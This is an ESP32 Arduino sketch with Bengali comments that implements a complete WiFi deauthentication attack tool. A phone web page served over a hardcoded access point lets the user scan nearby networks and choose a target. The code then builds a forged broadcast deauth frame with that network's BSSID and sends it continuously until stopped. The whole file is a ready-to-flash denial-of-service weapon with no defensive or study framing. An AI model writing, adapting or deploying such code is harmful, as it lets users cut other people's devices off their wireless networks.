#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include "esp_wifi.h"

WebServer server(80);

#define LED_PIN 2  // ESP32 Onboard LED (GPIO 2)

int selected_channel = 1;
uint8_t target_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
bool is_attacking = false;

// ডি-অথ ফ্রেম প্যাকেট
uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Receiver
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sender / BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence
    0x07, 0x00                          // Reason
};

void handleRoot() {
  String html = R"====(
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>ESP32 Deauth Tool</title>
  <style>
    body{font-family:Arial,sans-serif;background:#121212;color:#fff;margin:0;padding:16px;}
    .box{background:#1e1e1e;padding:15px;border-radius:10px;margin-bottom:15px;}
    h2,h3{color:#00e676;margin-top:0;}
    button{background:#00e676;color:#000;border:none;padding:12px;width:100%;font-weight:bold;border-radius:6px;cursor:pointer;margin-top:10px;}
    .stop-btn{background:#ff5252;color:#fff;}
    select,input{width:100%;padding:10px;background:#2c2c2c;color:#fff;border:1px solid #444;border-radius:6px;margin-top:5px;box-sizing:border-box;}
    .status{font-size:14px;padding:8px;background:#333;border-radius:5px;margin-top:10px;}
  </style>
</head>
<body>
  <h2>ESP32 Deauth Control</h2>

  <div class="box">
    <h3>১. ওয়াইফাই স্ক্যান ও সিলেক্ট</h3>
    <form action="/scan" method="GET">
      <button type="submit">WiFi Scan করুন</button>
    </form>
  </div>
)====";

  // স্ক্যান রেজাল্ট
  int n = WiFi.scanComplete();
  if (n > 0) {
    html += "<div class='box'><h3>স্ক্যান পাওয়া গেছে (" + String(n) + ")</h3>";
    html += "<form action='/start' method='POST'>";
    html += "<label>টার্গেট ওয়াইফাই সিলেক্ট করুন:</label><select name='target'>";
    for (int i = 0; i < n; ++i) {
      html += "<option value='" + String(i) + "'>" + WiFi.SSID(i) + " (Ch: " + String(WiFi.channel(i)) + ", RSSI: " + String(WiFi.RSSI(i)) + ")</option>";
    }
    html += "</select>";
    html += "<button type='submit'>Start Deauth Attack</button>";
    html += "</form></div>";
  } else if (n == -1) {
    html += "<div class='box'><p>স্ক্যান করা হচ্ছে... পেজটি রিফ্রেশ দিন।</p></div>";
  }

  // স্ট্যাটাস ও স্টপ বাটন
  html += "<div class='box'><h3>২. বর্তমান স্ট্যাটাস</h3>";
  if (is_attacking) {
    html += "<div class='status' style='color:#00e676;'><b>Status:</b> Deauth Attack রান হচ্ছে (LED জ্বলছে)</div>";
    html += "<form action='/stop' method='POST'><button type='submit' class='stop-btn'>Stop Attack</button></form>";
  } else {
    html += "<div class='status'><b>Status:</b> আইডল (বন্ধ রয়েছে)</div>";
  }
  html += "</div></body></html>";

  server.send(200, "text/html", html);
}

void handleScan() {
  WiFi.scanNetworks(true); // ব্যাকগ্রাউন্ডে স্ক্যান করবে
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handleStart() {
  if (server.hasArg("target")) {
    int id = server.arg("target").toInt();
    selected_channel = WiFi.channel(id);
    uint8_t* bssid = WiFi.BSSID(id);

    for (int i = 0; i < 6; i++) {
      target_mac[i] = bssid[i];
      deauthPacket[10 + i] = bssid[i];
      deauthPacket[16 + i] = bssid[i];
    }

    esp_wifi_set_channel(selected_channel, WIFI_SECOND_CHAN_NONE);
    is_attacking = true;
    digitalWrite(LED_PIN, HIGH); // এলইডি জ্বলে উঠবে
  }
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handleStop() {
  is_attacking = false;
  digitalWrite(LED_PIN, LOW); // এলইডি বন্ধ হবে
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("ESP32_Deauth_Tool", "12345678"); // তৈরি হওয়া AP নাম ও পাসওয়ার্ড

  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/start", HTTP_POST, handleStart);
  server.on("/stop", HTTP_POST, handleStop);

  server.begin();
  Serial.println("Web Server Started -> http://192.168.4.1");
}

void loop() {
  server.handleClient();

  if (is_attacking) {
    // ডি-অথ প্যাকেট পাঠানো
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(10); // প্যাকেটের ফ্রিকোয়েন্সি
  }
}
